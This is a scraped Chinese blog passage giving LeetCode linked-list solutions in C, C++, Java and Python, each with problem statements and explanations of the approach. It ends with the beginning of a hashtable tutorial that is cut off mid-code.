&quot;&quot;&quot; :type head: ListNode :rtype: ListNode &quot;&quot;&quot; dummy = p = ListNode(-1) p.next = head while p.next and p.next.next: a, b = p.next, p.next.next p.next = b a.next = b.next b.next = a p = a return dummy.next 25. Reverse Nodes in k-Group Given a linked list, reverse the nodes of a linked list k at a time and return its modified list. k is a positive integer and is less than or equal to the length of the linked list. If the number of nodes is not a multiple of k then left-out nodes in the end should remain as it is. You may not alter the values in the nodes, only nodes itself may be changed. Only constant memory is allowed. For example, Given this linked list: 1-&gt;2-&gt;3-&gt;4-&gt;5 For k = 2, you should return: 2-&gt;1-&gt;4-&gt;3-&gt;5 For k = 3, you should return: 3-&gt;2-&gt;1-&gt;4-&gt;5 题目地址：leetcode Reverse Nodes in k-Group 题目大意: 给定数字k，要求将这链表分为k组，每组进行逆置 比上面一题难处理一点。 主要是写个逆置的function，每次数到k个数调用。 需要注意的是本题是将链表的块进行调换，而不是交换元素值，需要特别注意调换后和调换前的块的位置关系。 C++ 123456789101112131415161718192021222324252627282930class Solution &#123; void reverse(ListNode *head, ListNode *tail) &#123; ListNode *tail_next = tail-&gt;next, *p = head-&gt;next; head-&gt;next = tail_next; while (p != tail_next) &#123; ListNode *q = p-&gt;next; p-&gt;next = head; head = p; p = q; &#125; &#125;public: ListNode * reverseKGroup(ListNode* head, int k) &#123; if (k &lt; 2 || !head) return head; ListNode dummy(-1), *p = &amp;dummy; p-&gt;next = head; while (p) &#123; ListNode *q = p, *t = p-&gt;next; for (int i = 0; i &lt; k &amp;&amp; q; ++i) q = q-&gt;next; if (!q) break; reverse(t, q); p-&gt;next = q; p = t; &#125; return dummy.next; &#125;&#125;; 61. Rotate List Given a list, rotate the list to the right by k places, where k is non-negative. For example: Given 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL and k = 2, return 4-&gt;5-&gt;1-&gt;2-&gt;3-&gt;NULL. 题目地址：leetcode Rotate List 题目大意: 给定一个链表，和k，要求从结尾开始算起第k个位置旋转到开头 思路：进行两次扫描，第一次扫描算出链表长度并且标记尾部。第二次扫描只需要找到右边算起第 k % len +1的位置即可。 C++ 12345678910111213141516171819202122232425262728293031/** * Definition for singly-linked list. * struct ListNode &#123; * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) &#123;&#125; * &#125;; */class Solution &#123;public: ListNode *rotateRight(ListNode *head, int k) &#123; if (!head) return head; ListNode *tail, *p = head; int len = 0; while (p -&gt; next)&#123; p = p-&gt;next; len++; &#125; len++; k %= len; tail = p; p = head; for (int i = 0; i &lt; len - k -1; i++)&#123; p = p-&gt;next; &#125; tail-&gt;next = head; head = p-&gt;next; p-&gt;next = NULL; return head; &#125;&#125;; Python 12345678910111213141516171819202122232425# Definition for singly-linked list.# class ListNode:# def __init__(self, x):# self.val = x# self.next = Noneclass Solution: # @param head, a ListNode # @param k, an integer # @return a ListNode def rotateRight(self, head, k): if not head: return head p , n = head , 0 while p.next: p , n = p.next , n + 1 n+=1 k %= n tail , p = p , head for i in range(n-k-1): p=p.next tail.next=head head=p.next p.next=None return head 86. Partition List Given a linked list and a value x, partition it such that all nodes less than x come before nodes greater than or equal to x. You should preserve the original relative order of the nodes in each of the two partitions. For example, Given 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;2 and x = 3, return 1-&gt;2-&gt;2-&gt;4-&gt;3-&gt;5. 题目地址：leetcode Partition List 题目大意：给定一个链表和一个数字x，要求对链表元素进行划分。将小于x的元素放在大于等于x元素的左边。 思路： 两个指针一个指向小于的，一个指向大于等于的，然后遍历链表即可。 C++ 12345678910111213141516class Solution &#123;public: ListNode* partition(ListNode* head, int x) &#123; ListNode lower(-1), greater(-1); ListNode *l = &amp;lower, *g = &amp;greater; for (ListNode *p = head; p; p = p-&gt;next) &#123; if (p-&gt;val &lt; x) l = l-&gt;next = p; else g = g-&gt;next = p; &#125; l-&gt;next = greater.next; g-&gt;next = nullptr; //需要设置为null！，否则g-&gt;next可能指向lower的某元素 return lower.next; &#125;&#125;; Python 1234567891011121314151617181920class Solution(object): def partition(self, head, x): &quot;&quot;&quot; :type head: ListNode :type x: int :rtype: ListNode &quot;&quot;&quot; l = left = ListNode(0) r = right = ListNode(0) while head: if head.val &lt; x: l.next = head l = l.next else: r.next = head r = r.next head = head.next l.next = right.next r.next = None return left.next discuss看到的另一种写法： 123456789101112131415161718class Solution &#123;public: ListNode* partition(ListNode* head, int x) &#123; ListNode left(0), right(0); ListNode *l = &amp;left, *r = &amp;right; while(head)&#123; ListNode* &amp; ref = head-&gt;val &lt; x ? l : r; ref-&gt;next = head; ref = ref-&gt;next; head = head-&gt;next; &#125; l-&gt;next = right.next; r-&gt;next = NULL; return left.next; &#125;&#125;; 138 . Copy List with Random Pointer A linked list is given such that each node contains an additional random pointer which could point to any node in the list or null. Return a deep copy of the list. 题目地址：leetcode Copy List with Random Pointer 题目大意：给定一个链表，链表中有个指针random，它随机指向该链表中的任何结点，现在请你复制这个链表（深度复制） 思路：需要深度复制的话，难点在于如何更改random指针，而不是照搬。（照搬的话原链表要是修改那么你random输出的也会被改）我直接用字典(dict c++也叫map)了。 123456789101112131415161718192021/** * Definition for singly-linked list with a random pointer. * struct RandomListNode &#123; * int label; * RandomListNode *next, *random; * RandomListNode(int x) : label(x), next(NULL), random(NULL) &#123;&#125; * &#125;; */class Solution &#123; unordered_map&lt;RandomListNode *, RandomListNode *&gt; vis;public: RandomListNode *copyRandomList(RandomListNode *head) &#123; if(!head) return head; if(vis.find(head) != vis.end()) return vis[head]; RandomListNode *new_head = new RandomListNode(head-&gt;label); vis[head] = new_head; new_head -&gt;next = copyRandomList(head-&gt;next); new_head -&gt;random = copyRandomList(head-&gt;random); return new_head; &#125;&#125;; Python 1234567891011121314151617181920212223# Definition for singly-linked list with a random pointer.# class RandomListNode(object):# def __init__(self, x):# self.label = x# self.next = None# self.random = Noneclass Solution(object): def __init__(self): self.dic = &#123;&#125; def copyRandomList(self, head): &quot;&quot;&quot; :type head: RandomListNode :rtype: RandomListNode &quot;&quot;&quot; if not head: return head if head in self.dic: return self.dic[head] self.dic[head] = RandomListNode(head.label) self.dic[head].next = self.copyRandomList(head.next) self.dic[head].random = self.copyRandomList(head.random) return self.dic[head] 141. Linked List Cycle Given a linked list, determine if it has a cycle in it. Follow up: Can you solve it without using extra space? 题目地址：leetcode Linked List Cycle 题意：给一个链表，判断其是否有环。 思路：假设两个小孩一直在绕操场跑，其中小孩A速度是小孩B的两倍，那么A一定会一次次的“追上”小孩B。所以两个指针，一个每次前进一步，一个两步，直到为空（无环）或者相等为止（有环） C 123456789bool hasCycle(struct ListNode *head) &#123; struct ListNode *p = head, *q = head; while (q &amp;&amp; q-&gt;next) &#123; p = p-&gt;next; q = q-&gt;next-&gt;next; if (p == q) return true; &#125; return false;&#125; C++ 123456789101112class Solution &#123;public: bool hasCycle(ListNode *head) &#123; ListNode *p = head, *q = head; while (q &amp;&amp; q-&gt;next) &#123; p = p-&gt;next; q = q-&gt;next-&gt;next; if (p == q) return true; &#125; return false; &#125;&#125;; Java 1234567891011public class Solution &#123; public boolean hasCycle(ListNode head) &#123; ListNode p = head, q = head; while (q != null &amp;&amp; q.next != null) &#123; p = p.next; q = q.next.next; if(p == q) return true; &#125; return false; &#125;&#125; Python 123456789101112class Solution(object): def hasCycle(self, head): &quot;&quot;&quot; :type head: ListNode :rtype: bool &quot;&quot;&quot; p = q = head while q and q.next: p = p.next q = q.next.next if p == q: return True return False 142. Linked List Cycle II Given a linked list, return the node where the cycle begins. If there is no cycle, return null. Follow up: Can you solve it without using extra space? 题目地址：leetcode Linked List Cycle II 题意：给一个链表，返回其开始环的地方，如果没有，返回NULL 思路： 同样的判圈法（见下面详细说明） hash表：遍历的同时存进hash表，若遇到重复的返回即可。 方法一： 上面的判断有圈子的方法我们在回顾一下： fast指针的速度为慢指针slow的两倍，如果有环，那么fast指针一定会追上慢指针slow！ 如上图所示：假设非环的部分长为a，第一次相遇点z离环的起点的y距离为b，slow指针在环上移动的距离不会超过一圈，为什么？考虑极端的情况，就是没有上图a那一段，那么快慢指针同时从y点出发，第一次相遇则恰好在y点处。而如果有a那一段的话，就不会走到y点了。 那么有： slow 指针距离= a + b fast指针距离 = a + b + c + b 由于fast是slow的两倍，因此有 2(a + b) = (a + b + c + b) 化简得 a = c 因此，当有环的时候，fast和slow相遇为z那么将fast或者slow重新指向开头head，然后各走a步，就会相遇于点y 换句话说：在z处走c也会回到y，从head走c也到达y。 C++ 123456789101112131415161718class Solution &#123;public: ListNode *detectCycle(ListNode *head) &#123; ListNode *p = head, *q = head; while (q &amp;&amp; q-&gt;next) &#123; p = p-&gt;next; q = q-&gt;next-&gt;next; if (p == q) break; &#125; if (!q || !q-&gt;next) return NULL; q = head; while (p != q) &#123; p = p-&gt;next; q = q-&gt;next; &#125; return p; &#125;&#125;; Java 123456789101112131415161718public class Solution &#123; public ListNode detectCycle(ListNode head) &#123; ListNode p = head, q = head; while (q != null &amp;&amp; q.next != null) &#123; p = p.next; q = q.next.next; if (p == q) break; &#125; if (q == null q.next == null) return null; q = head; while (p != q) &#123; p = p.next; q = q.next; &#125; return p; &#125;&#125; Python 123456789101112131415161718class Solution(object): def detectCycle(self, head): &quot;&quot;&quot; :type head: ListNode :rtype: ListNode &quot;&quot;&quot; fast = slow = head while fast and fast.next: fast = fast.next.next slow = slow.next if fast == slow: break if not fast or not fast.next: return None fast = head while fast != slow: fast = fast.next slow = slow.next return fast 方法二hash：（C的话得手写hash=v=懒） C++ 1234567891011121314class Solution &#123;public: ListNode *detectCycle(ListNode *head) &#123; if (head == NULL) return NULL; unordered_set&lt;ListNode *&gt; dic; dic.insert(head); while (head)&#123; head = head-&gt;next; if (dic.find(head) != dic.end())return head; dic.insert(head); &#125; return NULL; &#125;&#125;; Python 123456789101112class Solution: # @param head, a ListNode # @return a list node def detectCycle(self, head): if not head : return None dic = set([head]) while head: head=head.next if head in dic: return head dic.add(head) return None 143. Reorder List Given a singly linked list L: _L_0→_L_1→…→_L__n_-1→_L_n, reorder it to: _L_0→_L__n_→_L_1→_L__n_-1→_L_2→_L__n_-2→… You must do this in-place without altering the nodes' values. For example, Given &#123;1,2,3,4&#125;, reorder it to &#123;1,4,2,3&#125;. 题目地址：leetcode Reorder List 题目大意：给定一个链表 L0→L1→…→Ln-1→Ln,，返回L0→Ln→L1→Ln-1→L2→Ln-2的顺序 思路：分为3步： 求中点（可以先遍历找到中点，但更好的是快慢指针） 翻转后面的链表 两个链表合并 C++ 1234567891011121314151617181920212223242526272829303132333435363738class Solution &#123;public: void reorderList(ListNode* head) &#123; if(!head) return; ListNode *p = head, *q = head; while(q-&gt;next &amp;&amp; q-&gt;next-&gt;next)&#123; p = p-&gt;next; q = q-&gt;next-&gt;next; &#125; q = p-&gt;next; p-&gt;next = nullptr; ListNode *head2 = reverse(q); q = head2; while(head &amp;&amp; head2)&#123; p = head-&gt;next; head-&gt;next = head2; q = head2-&gt;next; head2-&gt;next = p; head = p; head2 = q; &#125; &#125; ListNode *reverse(ListNode *head)&#123; if(!head) return head; ListNode *p = head-&gt;next; ListNode *new_head = head; while(p)&#123; head-&gt;next = p-&gt;next; p-&gt;next = new_head; new_head = p; p = head-&gt;next; &#125; return new_head; &#125;&#125;; Python 12345678910111213141516171819202122232425class Solution: # @param head, a ListNode # @return nothing def reorderList(self, head): if not head or not head.next:return p ,n = head , 0 while p: p , n= p.next,n+1 #get length mid ,p= n&gt;&gt;1,head for i in xrange(mid): p=p.next rhead= self.reverseList(p) while rhead.next: t , p= head.next,rhead.next head.next=rhead rhead.next =head= t rhead=p def reverseList(self,head): cur ,pre=head.next,head while cur: next = cur.next cur.next ,pre.next = head,next head,cur=cur,next return head 123456789101112131415161718192021222324class Solution(object): def reorderList(self, head): &quot;&quot;&quot; :type head: ListNode :rtype: void Do not return anything, modify head in-place instead. &quot;&quot;&quot; if not head or not head.next: return p, q = head, head.next while q and q.next: p, q = p.next, q.next.next pre = rhead = p.next cur = rhead.next p.next = None while cur: # reverse a list next = cur.next cur.next, pre.next = rhead, next rhead, cur = cur, next p, q = head, rhead while q: t = q.next q.next, p.next = p.next, q p, q = p.next.next, t 147. leetcode Insertion Sort List Sort a linked list using insertion sort. 题目地址：leetcode Insertion Sort List 题意：对一个链表进行插入排序 思路：用tail标记包括tail之前已排好序的链表。对于cur=tail.next，先和tail比较，若大于等于，则不用排序，否则从头开始查找插入位置。 还有就是我用了哨兵结点，便于插入。 C/C++ 123456789101112131415161718192021222324struct ListNode* insertionSortList(struct ListNode* head) &#123; if (!head) return head; struct ListNode *newHead = (struct ListNode*)malloc(sizeof(struct ListNode)); newHead-&gt;next = head; struct ListNode *pre_p = head, *p = pre_p-&gt;next; while (p)&#123; struct ListNode *pre_q = newHead, *q = pre_q-&gt;next; while (q-&gt;val &lt;= p-&gt;val &amp;&amp; p != q)&#123;//有序 pre_q = q; q = q-&gt;next; &#125; if (p != q) &#123; pre_p-&gt;next = p-&gt;next; pre_q-&gt;next = p; p-&gt;next = q; &#125; else pre_p = pre_p-&gt;next; p = pre_p-&gt;next; &#125; head = newHead-&gt;next; free(newHead); return head;&#125; Python 123456789101112131415161718192021222324252627class Solution: # @param head, a ListNode # @return a ListNode def insertionSortList(self, head): if not head or not head.next:return head p = ListNode(-1) p.next, head=head,p tail = head.next while tail.next: cur =tail.next if tail.val &lt;= cur.val : tail = tail.next else: p ,prep= head.next,head while p.val &lt; cur.val: prep,p=prep.next,p.next self.delNode(tail,cur) self.insertNode(prep,cur) return head.next #del p from list, pre is previous node def delNode(self,pre,p): pre.next=p.next #insert p from list, pre is previous node def insertNode(self,pre,p): p.next , pre.next = pre.next , p 148. leetcode Sort List Sort a linked list in O(n log n) time using constant space complexity. 题目地址：leetcode Sort List 题意：给定一个链表，要求用O(n log n) 的复杂度进行排序。 思路：合并排序或者快排都行 123456789101112131415161718192021222324252627282930313233343536class Solution: # @param head, a ListNode # @return a ListNode def sortList(self, head): if not head or not head.next :return head p , one,two=ListNode(0),head,head p.next=head while two and two.next: p = one one , two = one.next,two.next.next p.next=None lhead=self.sortList(head) rhead=self.sortList(one) return self.merge(lhead,rhead) def merge(self,lhead,rhead): head = ListNode(-1) p,prep=None,head while lhead and rhead: if lhead.val &lt; rhead.val: p ,lhead= lhead,lhead.next else: p,rhead=rhead,rhead.next prep.next=p prep=prep.next while lhead: p , lhead= lhead,lhead.next prep.next=p prep=prep.next while rhead: p,rhead=rhead,rhead.next prep.next=p prep=prep.next return head.next 160. leetcode Intersection of Two Linked Lists Write a program to find the node at which the intersection of two singly linked lists begins. For example, the following two linked lists: 12345A: a1 → a2 ↘ c1 → c2 → c3 ↗ B: b1 → b2 → b3 begin to intersect at node c1. Notes: If the two linked lists have no intersection at all, return null. The linked lists must retain their original structure after the function returns. You may assume there are no cycles anywhere in the entire linked structure. Your code should preferably run in O(n) time and use only O(1) memory. 题目地址：leetcode Intersection of Two Linked Lists 题意：给定两个链表，返回其重复的第一个位置。 思路： 用哈希表O(n+m) 空间为O(m)或者O(n) 由于两个链表可能一长一短，故对其同时进行遍历时一定有一个先到达结尾。如果链表A先到结尾，则指向B的开头，如果B先到达结尾，则指向A的开头。然后继续进行遍历，这样两个链表一定同时到达结尾。当到达结尾时，如果之前最早出现过两个指针指向地址相同的，那么就是所求解。这样正确的原因在于，如果两个链表尾部有重复的，那么两个链表链接起来不管是a+b还是b+a尾部也一定是一样的。- - 然后长度还一样，没啥好说的了。 方法一(hash) c 的hash表(介绍详见leetcode哈希表) Python 12345678910111213class Solution: # @param two ListNodes # @return the intersected ListNode def getIntersectionNode(self, headA, headB): dic=set() while headA: dic.add(headA) headA=headA.next while headB: if headB in dic: return headB headB=headB.next return None 方法二 C++ 123456789101112class Solution &#123;public: ListNode *getIntersectionNode(ListNode *headA, ListNode *headB) &#123; ListNode* p = headA; ListNode* q = headB; while (p != q) &#123; p = p ? p-&gt;next : headB; q = q ? q-&gt;next : headA; &#125; return p; &#125;&#125;; Java 1234567891011121314public class Solution &#123; public ListNode getIntersectionNode(ListNode headA, ListNode headB) &#123; if (headA == null headB == null) return null; ListNode p = headA, q = headB; while (p != null q != null) &#123; if (p == null) p = headB; if (q == null) q = headA; if(p == q) return p; p = p.next; q = q.next; &#125; return null; &#125;&#125; Python 1234567class Solution: def getIntersectionNode(self, headA: ListNode, headB: ListNode) -&gt; ListNode: p, q = headA, headB while p != q: p = p.next if p else headB q = q.next if q else headA return p 203. leetcode Remove Linked List Elements Remove all elements from a linked list of integers that have value val. Example Given: 1 --&gt; 2 --&gt; 6 --&gt; 3 --&gt; 4 --&gt; 5 --&gt; 6, val = 6 Return: 1 --&gt; 2 --&gt; 3 --&gt; 4 --&gt; 5 题目地址：leetcode Remove Linked List Elements 题意：给定一个链表，删除值为val的全部元素 思路： 建一个哨兵节点统一删除操作，这个没啥好说的，代码在比较下面 使用C++引用+递归 C++ 引用+递归 单向链表使用引用的递归删除。 当L-&gt;val == x时候，当前的结点为待删除的结点，故用指针指向当前结点（p = L)，并且让当前结点指向下一个结点(L=L-&gt;next)，之后我们删除该结点(delete p)，并且调用del_x(L,x); （毕竟现在的L可能也等于x） 当L-&gt;val != x时候，当前结点并不是要删除的结点，调用del_x(L-&gt;next,x); 我们知道，在非递归版本中，我们每次记录前项，然后删除的时候将该结点的前结点指向该结点的下一个结点。 使用引用的话，可以不用记录前项，而且不会产生断链。 为什么？以1，2，3 删除数为2 为例子。（下面把1 ， 2， 3 内存地址称为A,B,C，方便说明） 初始L指向A，非待删除结点，执行 del_x(L-&gt;next,x); 此时L-&gt;next 指向了B L指向B， 需要删除， L = L-&gt;next 的时候，因为此时的L使用引用，其值为A-&gt;next，效果等同于A-&gt;next = B -&gt;next 就是说A-&gt;next指向了C， 删除B后，执行del_x(L,x); L指向C，非待删除，调用del_x(L-&gt;next,x); L为NULL，return 1234567891011121314151617181920212223242526/** * Definition for singly-linked list. * struct ListNode &#123; * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) &#123;&#125; * &#125;; */class Solution &#123;public: void del_x(ListNode* &amp;L,int x)&#123; if(L == NULL) return; if(L-&gt;val == x)&#123; ListNode *p = L; L = L-&gt;next; delete p; del_x(L,x); &#125; else del_x(L-&gt;next,x); &#125; ListNode* removeElements(ListNode* head, int val) &#123; del_x(head,val); return head; &#125;&#125;; C 123456789101112131415161718struct ListNode* removeElements(struct ListNode* head, int val) &#123; struct ListNode* newHead = (struct ListNode*) malloc(sizeof(struct ListNode)); newHead-&gt;next = head; //新建个头结点（哨兵节点）统一操作 struct ListNode *p = newHead, *q = head; //q为p后一个元素 while (q) &#123; if (q-&gt;val == val)&#123; p-&gt;next = q-&gt;next; free(q); &#125; else p = p-&gt;next; q = p-&gt;next; &#125; struct ListNode* res = newHead-&gt;next; free(newHead); return res;&#125; C++ 1234567891011121314151617181920class Solution &#123;public: ListNode* removeElements(ListNode* head, int val) &#123; ListNode* newHead = new ListNode(-1); newHead-&gt;next = head; //新建个头结点（哨兵节点）统一操作 ListNode *p = newHead, *q = head; //q为p后一个元素 while (q) &#123; if (q-&gt;val == val)&#123; p-&gt;next = q-&gt;next; delete q; &#125; else p = p-&gt;next; q = p-&gt;next; &#125; ListNode* res = newHead-&gt;next; delete newHead; return res; &#125;&#125;; Python 12345678910111213class Solution: # @param &#123;ListNode&#125; head # @param &#123;integer&#125; val # @return &#123;ListNode&#125; def removeElements(self, head, val): if not head: return head p = newHead = ListNode(-1) newHead.next = q =head while q: if q.val == val: p.next=q.next else: p = p.next q = q.next return newHead.next 206. leetcode Reverse Linked List Reverse a singly linked list. 题目地址：leetcode Reverse Linked List 题意：链表逆序 思路：每次遍历到某个元素把它变为“头”即可 C 1234567891011struct ListNode* reverseList(struct ListNode* head) &#123; if (!head) return head; //head 为NULL struct ListNode *p = head, *q = head-&gt;next; while (q)&#123; p-&gt;next = q-&gt;next; q-&gt;next = head; head = q; q = p-&gt;next; &#125; return head;&#125; C++(和C差不多，不必看) 1234567891011121314class Solution &#123;public: ListNode* reverseList(ListNode* head) &#123; if (!head) return head; //head 为NULL ListNode *p = head, *q = head-&gt;next; while (q)&#123; p-&gt;next = q-&gt;next; q-&gt;next = head; head = q; q = p-&gt;next; &#125; return head; &#125;&#125;; python (其实都差不多好不好 (╯‵□′)╯︵┻━┻) 123456789101112class Solution: # @param &#123;ListNode&#125; head # @return &#123;ListNode&#125; def reverseList(self, head): if not head:return head p ,q =head, head.next while q: p.next = q.next q.next = head head = q q = p.next return head 另外一种方法 方法2: cur和pre双指针，每次pre为cur后面一个元素，遍历的时候将pre-&gt;next指向cur即可 123456789101112class Solution: def reverseList(self, head: ListNode) -&gt; ListNode: if not head: return head cur = None pre = head while pre: temp = pre.next pre.next = cur cur = pre pre = temp return cur C++ 1234567891011121314151617class Solution &#123;public: ListNode* reverseList(ListNode* head) &#123; if (head == nullptr) &#123; return head; &#125; ListNode* p = nullptr; ListNode* q = head; while (q != nullptr) &#123; ListNode* temp = q-&gt;next; q-&gt;next = p; p = q; q = temp; &#125; return p; &#125;&#125;; 234. Palindrome Linked List Given a singly linked list, determine if it is a palindrome. Follow up: Could you do it in O(n) time and O(1) space? 题目地址：leetcode Palindrome Linked List 题意：给定一个链表，判断它是否为回文串 思路：最简单的方法是直接保存下来对比一下时间空间复杂度均为O(n) 1234567891011121314151617# Definition for singly-linked list.# class ListNode(object):# def __init__(self, x):# self.val = x# self.next = Noneclass Solution(object): def isPalindrome(self, head): &quot;&quot;&quot; :type head: ListNode :rtype: bool &quot;&quot;&quot; t = [] while head: t.append(head.val) head = head.next return t == t[::-1] 第二种方法是将链表分为两半，前一半或者后一半逆序然后比较。 1234567891011121314151617181920212223242526class Solution(object): def isPalindrome(self, head): &quot;&quot;&quot; :type head: ListNode :rtype: bool &quot;&quot;&quot; if not head or not head.next: return True slow = fast = head while fast.next and fast.next.next: slow = slow.next fast = fast.next.next right = self.reverse_list(slow.next) left = head while right: if left.val != right.val: return False left, right = left.next, right.next return True def reverse_list(self, head): p, head.next = head.next, None while p: next, p.next = p.next, head head, p = p, next return head 237 Delete Node in a Linked List Write a function to delete a node (except the tail) in a singly linked list, given only access to that node. Supposed the linked list is 1 -&gt; 2 -&gt; 3 -&gt; 4 and you are given the third node with value 3, the linked list should become 1 -&gt; 2 -&gt; 4 after calling your function. 题目地址：leetcode Delete Node in a Linked List 题意：给定指向要删除的节点的指针，删除这个节点。 思路：把这个指针内容复制为下一个，然后删除下一个即可。 C++ 12345678class Solution &#123;public: void deleteNode(ListNode* node) &#123; ListNode * next = node-&gt;next; *node = *next; delete next; &#125;&#125;; Python 12345678class Solution(object): def deleteNode(self, node): &quot;&quot;&quot; :type node: ListNode :rtype: void Do not return anything, modify node in-place instead. &quot;&quot;&quot; node.val = node.next.val node.next = node.next.next 817. Linked List Components We are given head, the head node of a linked list containing unique integer values. We are also given the list G, a subset of the values in the linked list. Return the number of connected components in G, where two values are connected if they appear consecutively in the linked list. Example 1: Input: head: 0-&gt;1-&gt;2-&gt;3 G = [0, 1, 3] Output: 2 Explanation: 0 and 1 are connected, so [0, 1] and [3] are the two connected components. Example 2: Input: head: 0-&gt;1-&gt;2-&gt;3-&gt;4 G = [0, 3, 1, 4] Output: 2 Explanation: 0 and 1 are connected, 3 and 4 are connected, so [0, 1] and [3, 4] are the two connected components. Note: If N is the length of the linked list given by head, 1 &lt;= N &lt;= 10000. The value of each node in the linked list will be in the range [0, N - 1]. 1 &lt;= G.length &lt;= 10000. G is a subset of all values in the linked list. 题目地址：leetcode Linked List Components 题目大意：给定一个链表和一个数组G，让你判断G中包含链表中几个“连接的部分”。连接的部分定义为：两个值连续出现即为一个连接部分。 思路：把G变为set，遍历数组，记录前一个是否为连接的从而进行分组。 C++ 1234567891011121314151617181920class Solution &#123;public: int numComponents(ListNode* head, vector&lt;int&gt;&amp; G) &#123; if(!head) return 0; int cnt = 0; bool pre_in = false; unordered_set&lt;int&gt; g(G.begin(), G.end()); for(; head; head = head-&gt;next)&#123; if(g.find(head-&gt;val) != g.end())&#123; if(!pre_in)&#123; pre_in = true; ++cnt; &#125; &#125; else pre_in = false; &#125; return cnt; &#125;&#125;; Python 1234567891011121314151617181920class Solution(object): def numComponents(self, head, G): &quot;&quot;&quot; :type head: ListNode :type G: List[int] :rtype: int &quot;&quot;&quot; if not head: return 0 pre_in = False G = set(G) cnt = 0 while head: if head.val in G: if not pre_in: pre_in = True cnt += 1 else: pre_in = False head = head.next return cnt 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"leetcode hashtable","slug":"leetcode-hashtable","date":"2015-06-22T02:27:54.000Z","updated":"2021-01-08T13:32:16.849Z","comments":true,"path":"leetcode-hashtable/","link":"","permalink":"https://www.hrwhisper.me/leetcode-hashtable/","excerpt":"本题解包括： hashtable简洁即实现 3 Longest Substring Without Repeating Characters 160 Intersection of Two Linked Lists 202 Happy Number 242 Valid Anagram","text":"本题解包括： hashtable简洁即实现 3 Longest Substring Without Repeating Characters 160 Intersection of Two Linked Lists 202 Happy Number 242 Valid Anagram 一、hashtable简介 散列表（Hash table，也叫哈希表）,它通过把关键码值映射到表中一个位置来访问记录，以加快查找的速度。这个映射函数叫做散列函数，存放记录的数组叫做散列表。 若关键字为k，则其值存放在f(k)的存储位置上。由此，要查找k的位置直接去f(k)查找即可。 对不同的关键字可能得到同一散列地址，即k1≠k2，而f(k1)=f(k2)，这种现象称为冲突/碰撞（Collision）。可以说collision是不可避免的。但是有一些处理冲突的办法： 开散列：相同的key 存于链中 闭散列：相同key存于 不同的槽中 多个hashtable ： 如果一个冲突的概率是0.1.。那么我们用两个不同的散列函数，可以大大冲突概率。（暴雪好像就是这么做的，用了三个散列表，使得冲突概率为几亿分之一） 对于数字，常见的散列函数可以为 % 一个数（经常是2的倍数-1 ，可以用位与来优化速度！） 一个开散列的C实现如下（使用了静态的邻接表）： （C++可以把define改为const int N = 1&lt;&lt;7; ） 1234567891011121314151617181920#define N (1&lt;&lt;7)int head[N], len = 0, mod = N - 1;struct node&#123; int val; int next;&#125;data[10000];void insert(int n)&#123; int pos = n &amp; mod; data[len].val = n; data[len].next = head[pos]; //插入第一个位置 head[pos] = len++;&#125;bool found(int n)&#123; int pos = n &amp; mod; for (int i = head[pos]; i != -1; i = data[i].next) if (data[i].val == n) return true; return false;&#125; 什么你问python？乖乖的去用set吧（其实c++是用unordered_set，不要重复发明轮子） 以leetcode 202 Happy Number为例，来演示一下他们的用法： 二、题解 3. Longest Substring Without Repeating Characters Given a string, find the length of the longest substring without repeating characters. Examples: Given \"abcabcbb\", the answer is \"abc\", which the length is 3. Given \"bbbbb\", the answer is \"b\", with the length of 1. Given \"pwwkew\", the answer is \"wke\", with the length of 3. Note that the answer must be a substring, \"pwke\" is a subsequence and not a substring. 题目地址：leetcode Longest Substring Without Repeating Characters 题意：给定一个字符串s，求它最长的不重复字母的子串长度。 思路：最naive的方法是，枚举起点和终点，O(n^2)，但是有很多重复的工作。 进一步可以改进为双指针+哈希表。 首先i指针指向字符串开头，而j指向结尾。每次扫描到一个字符s[j]，有： 若该字符在hash表中，则说明s[j]在之前出现过，我们需要删除hash表中的字符s[i....vis[s[j]]]中的所有信息。并且将i 设置为 vis[s[j]] += 1（因为vis[s[j]]保存了上一个s[j]的下标，必须+1的位置才可能作为新的起点） 将该字符的下表写进hash表。 就是vis[s[j]] = j 看看能否更新最大长度。 Python 1234567891011121314151617class Solution(object): def lengthOfLongestSubstring(self, s): &quot;&quot;&quot; :type s: str :rtype: int &quot;&quot;&quot; if not s: return 0 vis = &#123;&#125; i = ans = 0 for j in range(len(s)): if s[j] in vis: for x in range(i,vis[s[j]]): del vis[s[x]] i = vis[s[j]] + 1 ans = max(ans, j - i + 1) vis[s[j]] = j return ans 当然，也可以直接用一个长度为128的数组 1234567891011121314151617class Solution(object): def lengthOfLongestSubstring(self, s): &quot;&quot;&quot; :type s: str :rtype: int &quot;&quot;&quot; if not s: return 0 vis = [-1] * 128 i = ans = 0 for j in range(len(s)): if vis[ord(s[j])] != - 1: for x in range(i, vis[ord(s[j])]): vis[ord(s[x])] = -1 i = vis[ord(s[j])] + 1 ans = max(ans, j - i + 1) vis[ord(s[j])] = j return ans 或者直接Sliding window也行(其实都差不多，只是不记录下标，只记录访问过没有),复杂度也是O(n) C++ 1234567891011121314151617class Solution &#123;public: int lengthOfLongestSubstring(string s) &#123; vector&lt;int&gt; vis(128, 0); int start = 0, max_len = 0; for(int i = 0; i &lt; s.size(); i++)&#123; if (vis[s[i]]) &#123; for (; s[i] != s[start]; start++) vis[s[start]] = 0; vis[s[start++]] = 0; &#125; vis[s[i]] = 1; max_len = max(max_len, i - start + 1); &#125; return max_len; &#125;&#125;; Java 1234567891011121314151617class Solution &#123; public int lengthOfLongestSubstring(String s) &#123; boolean[] vis = new boolean[128]; int start = 0, maxLen = 0; for (int i = 0; i &lt; s.length(); i++) &#123; if (vis[s.charAt(i)]) &#123; for (; s.charAt(i) != s.charAt(start); start++) vis[s.charAt(start)] = false; vis[s.charAt(start++)] = false; &#125; vis[s.charAt(i)] = true; if (i - start + 1 &gt; maxLen) maxLen = i - start + 1; &#125; return maxLen; &#125;&#125; Python 12345678910111213141516171819class Solution(object): def lengthOfLongestSubstring(self, s): &quot;&quot;&quot; :type s: str :rtype: int &quot;&quot;&quot; vis = [False] * 128 start = max_len = 0 for i in 